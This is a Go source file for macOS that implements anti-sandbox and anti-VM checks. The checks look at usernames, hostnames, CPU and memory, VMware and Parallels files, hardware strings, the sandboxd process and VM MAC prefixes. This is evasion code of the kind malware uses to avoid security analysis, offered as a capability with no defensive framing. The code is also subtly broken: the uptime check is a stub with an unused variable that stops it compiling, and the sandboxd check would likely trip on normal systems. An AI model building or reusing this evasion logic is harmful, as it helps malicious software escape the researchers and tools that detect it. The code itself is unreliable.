// +build darwin

package main

import (
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
)

// AntiSandboxDarwin provides anti-sandbox capabilities for macOS
type AntiSandboxDarwin struct{}

func NewAntiSandbox() *AntiSandboxDarwin {
	return &AntiSandboxDarwin{}
}

// CheckUsername checks for common sandbox usernames
func (a *AntiSandboxDarwin) CheckUsername() bool {
	sandboxUsers := []string{
		"malware",
		"sample",
		"virus",
		"sandbox",
		"vmware",
		"parallels",
		"test",
	}

	currentUser, err := user.Current()
	if err != nil {
		return false
	}

	username := strings.ToLower(currentUser.Username)
	for _, sandbox := range sandboxUsers {
		if strings.Contains(username, sandbox) {
			return true
		}
	}

	return false
}

// CheckHostname checks for common sandbox hostnames
func (a *AntiSandboxDarwin) CheckHostname() bool {
	sandboxHosts := []string{
		"sample",
		"virus",
		"sandbox",
		"malware",
		"vmware",
		"virtual",
		"parallels",
	}

	hostname, err := os.Hostname()
	if err != nil {
		return false
	}

	hostname = strings.ToLower(hostname)
	for _, sandbox := range sandboxHosts {
		if strings.Contains(hostname, sandbox) {
			return true
		}
	}

	return false
}

// CheckCores checks for low CPU cores
func (a *AntiSandboxDarwin) CheckCores() bool {
	if runtime.NumCPU() < 2 {
		return true
	}
	return false
}

// CheckMemory checks for low memory
func (a *AntiSandboxDarwin) CheckMemory() bool {
	// Use sysctl to check memory
	cmd := exec.Command("sysctl", "-n", "hw.memsize")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	memBytes, _ := strconv.ParseInt(strings.TrimSpace(string(output)), 10, 64)

	// Less than 4GB
	if memBytes < 4*1024*1024*1024 {
		return true
	}

	return false
}

// CheckUptime checks for low system uptime
func (a *AntiSandboxDarwin) CheckUptime() bool {
	cmd := exec.Command("uptime")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	// Parse uptime - simplified check
	// Real implementation would parse the output properly
	return false
}

// CheckVirtualization checks for VM artifacts
func (a *AntiSandboxDarwin) CheckVirtualization() bool {
	// Check for VM files
	vmFiles := []string{
		"/Library/Application Support/VMware Tools",
		"/Library/Application Support/Parallels",
		"/System/Library/Extensions/AppleHVSupport.kext",
	}

	for _, path := range vmFiles {
		if _, err := os.Stat(path); err == nil {
			return true
		}
	}

	// Check system_profiler for VM indicators
	cmd := exec.Command("system_profiler", "SPHardwareDataType")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	hardwareInfo := string(output)
	vmIndicators := []string{
		"VMware",
		"Parallels",
		"VirtualBox",
		"QEMU",
	}

	for _, indicator := range vmIndicators {
		if strings.Contains(hardwareInfo, indicator) {
			return true
		}
	}

	return false
}

// CheckSandbox checks if running in macOS sandbox
func (a *AntiSandboxDarwin) CheckSandbox() bool {
	// Check for sandbox profile
	if os.Getenv("APP_SANDBOX_CONTAINER_ID") != "" {
		return true
	}

	// Check if sandboxd is running
	cmd := exec.Command("pgrep", "sandboxd")
	if cmd.Run() == nil {
		return true
	}

	return false
}

// CheckMACAddress checks for VM MAC addresses
func (a *AntiSandboxDarwin) CheckMACAddress() bool {
	vmMACs := []string{
		"00:0C:29", // VMware
		"00:1C:14", // VMware
		"00:50:56", // VMware
		"08:00:27", // VirtualBox
		"00:1C:42", // Parallels
		"00:03:FF", // Microsoft
	}

	// Use ifconfig to get MAC addresses
	cmd := exec.Command("ifconfig")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	ifconfig := string(output)
	for _, vmMAC := range vmMACs {
		if strings.Contains(strings.ToLower(ifconfig), strings.ToLower(vmMAC)) {
			return true
		}
	}

	return false
}

// RunAllChecks runs all anti-sandbox checks
func (a *AntiSandboxDarwin) RunAllChecks() bool {
	if a.CheckUsername() {
		return true
	}
	if a.CheckHostname() {
		return true
	}
	if a.CheckCores() {
		return true
	}
	if a.CheckMemory() {
		return true
	}
	if a.CheckVirtualization() {
		return true
	}
	if a.CheckSandbox() {
		return true
	}
	if a.CheckMACAddress() {
		return true
	}
	return false
}
